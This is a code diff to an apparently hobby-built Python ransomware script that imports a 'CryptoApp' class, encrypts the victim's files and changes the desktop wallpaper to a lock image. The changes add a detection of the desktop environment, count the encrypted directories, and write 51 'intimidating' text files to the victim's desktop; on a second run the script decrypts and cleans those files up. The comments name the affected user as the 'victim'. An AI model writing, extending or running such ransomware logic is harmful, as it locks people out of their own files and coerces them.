@@ -2,6 +2,8 @@ from cryptography.fernet import Fernet
 from CryptoApp import CryptoApp
 import os
 import json
+from operator import itemgetter
+import glob
 
 
 JSON_PATH = 'info.json'
@@ -10,18 +12,23 @@ JSON_PATH = 'info.json'
 APP = CryptoApp([
     JSON_PATH,
     '__pycache__',
-    'not',
     'locked.jpg'
 ])
 
 
 # Init the variables
-# Victim's OS, and empty wallpaper variable
-OS = APP.determineOS()
+target_os, target_de = itemgetter('os', 'de')(APP.determineOS())
 new_wallpaper = None
+extra_files_name = 'Hello_lock'
+desktop_path = os.path.expanduser('~/Desktop')
 
 
 if APP.isAlreadyEncrypted():
+    # Remove every extra file that was created during encryption (on desktop)
+    for file in glob.glob(f'{desktop_path}/{extra_files_name}*.txt'):
+        try: os.remove(file)
+        except: continue
+
     APP.decrypt()
 
     # If decrypted successfully, handle the JSON file
@@ -39,16 +46,20 @@ if APP.isAlreadyEncrypted():
         os.remove(JSON_PATH)
 
 else:
-    # Get the number of total modified files
-    files_num = APP.encrypt()
+    # Encrypt, and get the number of total modified files and directories
+    APP.encrypt()
+    dirs_num, files_num = itemgetter('dirs', 'files')(APP.getCount()) 
 
     # Save some informations to a JSON file
-    asJSON = OS
+    asJSON = {}
+    asJSON['os'] = target_os
+    asJSON['de'] = target_de
     asJSON["status"] = 'encrypted'
+    asJSON["directories"] = dirs_num
     asJSON["files_modified"] = files_num
 
     # Get the current wallpaper
-    currentBG = APP.getDesktopBG(OS["os"], OS["de"])
+    currentBG = APP.getDesktopBG(target_os, target_de)
     if currentBG:
         # And save it
         asJSON["original_background"] = currentBG
@@ -61,10 +72,14 @@ else:
     j = json.dumps(asJSON, indent=4)
     APP.writeFile(JSON_PATH, j)
 
+    # Create some intimidating files on Desktop
+    for i in range(0, 51):
+        APP.writeFile(f'{desktop_path}/{extra_files_name}{i}.txt', 'Hello')
+
 
 
 # Change the victim's wallpaper
-APP.setDesktopBG(OS["os"], OS["de"], new_wallpaper)
+APP.setDesktopBG(target_os, target_de, new_wallpaper)
 
 
 
